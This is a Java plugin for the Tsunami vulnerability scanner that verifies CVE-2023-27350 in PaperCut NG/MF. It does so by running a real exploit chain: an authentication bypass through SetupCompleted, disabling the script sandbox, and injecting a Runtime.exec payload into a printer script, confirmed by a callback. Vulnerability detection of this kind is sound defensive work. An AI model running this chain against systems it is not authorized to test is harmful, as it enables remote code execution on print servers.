/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.papercut;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.*;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "PapercutNGMRVulnDetectorWithPayload",
    version = "1.0",
    description = "Detects papercut versions that are vulnerable to authentication bypass and RCE.",
    author = "Isaac_GC (isaac@nu-that.us)",
    bootstrapModule = PapercutNGMFVulnDetectorWithPayloadBootstrapModule.class)
public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  PapercutNGMFVulnDetectorWithPayload(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-27350 (PaperCut NG/MF) starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private HttpResponse sendRequestPayload(
      RequestType reqType,
      String uri,
      String body,
      HttpHeaders headers,
      NetworkService networkService) {
    HttpRequest req;
    ByteString bodyBytes = ByteString.copyFrom(body, StandardCharsets.UTF_8);

    if (reqType == RequestType.POST) {
      req = HttpRequest.post(uri).setHeaders(headers).setRequestBody(bodyBytes).build();
    } else {
      req = HttpRequest.get(uri).setHeaders(headers).build();
    }

    HttpResponse resp = null;
    try {
      resp = this.httpClient.send(req, networkService);
    } catch (Exception err) {
      logger.atWarning().withCause(err).log();
    }
    return resp;
  }

  private void changeSettingForPayload(
      String settingName, Boolean enable, NetworkService networkService, HttpHeaders headers) {
    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String settingNav =
        "service=direct%2F1%2FConfigEditor%2FquickFindForm&sp=S0&Form0=%24TextField%2CdoQuickFind%2Cclear&%24TextField="
            + settingName
            + "&doQuickFind=Go";
    String settingAction =
        "service=direct%2F1%2FConfigEditor%2F%24Form&sp=S1&Form1=%24TextField%240%2C%24Submit%2C%24Submit%240&%24TextField%240="
            + (enable ? "Y" : "N")
            + "&%24Submit=Update";

    // "Navigate" to the page
    sendRequestPayload(RequestType.POST, rootUri + "app", settingNav, headers, networkService);

    // Enable/Disable the setting
    sendRequestPayload(RequestType.POST, rootUri + "app", settingAction, headers, networkService);
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    boolean isVulnerable = false;
    String JSESSION_ID = "";

    // Generate the payload
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = this.payloadGenerator.generate(config);

    if (!payload.getPayloadAttributes().getUsesCallbackServer()) return false;

    // Get the JSESSION_ID (if present)
    HttpHeaders basicHeader = HttpHeaders.builder().addHeader("Origin", rootUri).build();
    HttpRequest req =
        HttpRequest.get(rootUri + "app?service=page/SetupCompleted")
            .setHeaders(basicHeader)
            .build();

    try {
      // Try to get the JSESSION_ID cookie and see if the page can be loaded
      HttpResponse resp = httpClient.send(req, networkService);
      String setCookiesHeader = resp.headers().get("Set-Cookie").orElse("");
      String bodyContent = resp.bodyString().orElse("");

      Matcher jsessionIdMatcher =
          Pattern.compile("JSESSIONID=[a-zA-Z0-9.]+;", Pattern.CASE_INSENSITIVE)
              .matcher(setCookiesHeader);

      Matcher bodyContentMatcher =
          Pattern.compile("Configuration Wizard : Setup Complete").matcher(bodyContent);

      if (resp.status() == HttpStatus.OK && bodyContentMatcher.find() && jsessionIdMatcher.find()) {
        JSESSION_ID = jsessionIdMatcher.group();
        isVulnerable = true;
      } else {
        isVulnerable = false;
      }
    } catch (IOException err) {
      logger.atWarning().withCause(err).log();
    }

    if (isVulnerable) {
      // Prepare the PaperCut NG/MF instance for the payload
      HttpHeaders payloadHeaders =
          HttpHeaders.builder()
              .addHeader("Origin", rootUri)
              .addHeader("Cookie", JSESSION_ID)
              .addHeader("Content-Type", "application/x-www-form-urlencoded")
              .build();

      // Login via SetupCompleted page
      sendRequestPayload(
          RequestType.POST,
          rootUri + "app",
          "service=direct%2F1%2FSetupCompleted%2F%24Form&sp=S0&Form0=%24Hidden%2CanalyticsEnabled%2C%24Submit&%24Hidden=true&%24Submit=Login",
          payloadHeaders,
          networkService);

      // Get 'print-and-device.script.enabled' settings and enable it
      changeSettingForPayload(
          "print-and-device.script.enable", true, networkService, payloadHeaders);

      // Get 'print.script.sandboxed' settings and enable it
      changeSettingForPayload("print.script.sandboxed", false, networkService, payloadHeaders);

      // Get list of printers
      sendRequestPayload(
          RequestType.GET,
          rootUri + "app?service=page/PrinterList",
          "service=page%2FPrinterList",
          payloadHeaders,
          networkService);

      // "Select" the printer
      sendRequestPayload(
          RequestType.POST,
          rootUri + "app?service=direct/1/PrinterList/selectPrinter&sp=l1001",
          "service=direct%2F1%2FPrinterList%2FselectPrinter&sp=l1001",
          payloadHeaders,
          networkService);

      // Select the Scripting tab
      sendRequestPayload(
          RequestType.POST,
          rootUri + "app",
          "service=direct%2F1%2FPrinterDetails%2FprinterOptionsTab.tab&sp=4",
          payloadHeaders,
          networkService);

      // Apply the RCE Payload
      String rceInjection = payload.getPayload();

      sendRequestPayload(
          RequestType.POST,
          rootUri + "app",
          "service=direct%2F1%2FPrinterDetails%2F%24PrinterDetailsScript.%24Form&sp=S0&Form0=printerId%2CenablePrintScript%2CscriptBody%2C%24Submit%2C%24Submit%240%2C%24Submit%241&printerId=l1001&enablePrintScript=on&scriptBody=function+printJobHook%28inputs%2C+actions%29+%7B%7D%0D%0Ajava.lang.Runtime.getRuntime%28%29.exec%28%27"
              + rceInjection
              + "%27%29%3B&%24Submit%241=Apply",
          payloadHeaders,
          networkService);

      isVulnerable = payload.checkIfExecuted();

      // Revert the previously changed settings (not necessary, but helps keep a light touch and
      // clean environment)
      changeSettingForPayload(
          "print-and-device.script.enable", false, networkService, payloadHeaders);
      changeSettingForPayload("print.script.sandboxed", true, networkService, payloadHeaders);

      return isVulnerable;
    }
    return false; // by default
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_27350"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Papercut NG/MF Authentication Bypass and RCE")
                .setDescription(
                    "This vulnerability allows remote attackers to bypass authentication"
                        + " on affected installations of PaperCut NG/MF."
                        + " Authentication is not required to exploit this vulnerability."
                        + " The specific flaw exists within the SetupCompleted class and the"
                        + " issue results from improper access control."
                        + " An attacker can leverage this vulnerability to bypass authentication"
                        + " and execute arbitrary code in the context of SYSTEM (Windows) "
                        + "or Root/Papercut User (Linux).")
                .setRecommendation(
                    "Update to versions that are at least 20.1.7, 21.2.11, 22.0.9, or any later"
                        + " version."))
        .build();
  }

  private enum RequestType {
    GET,
    POST
  }
}
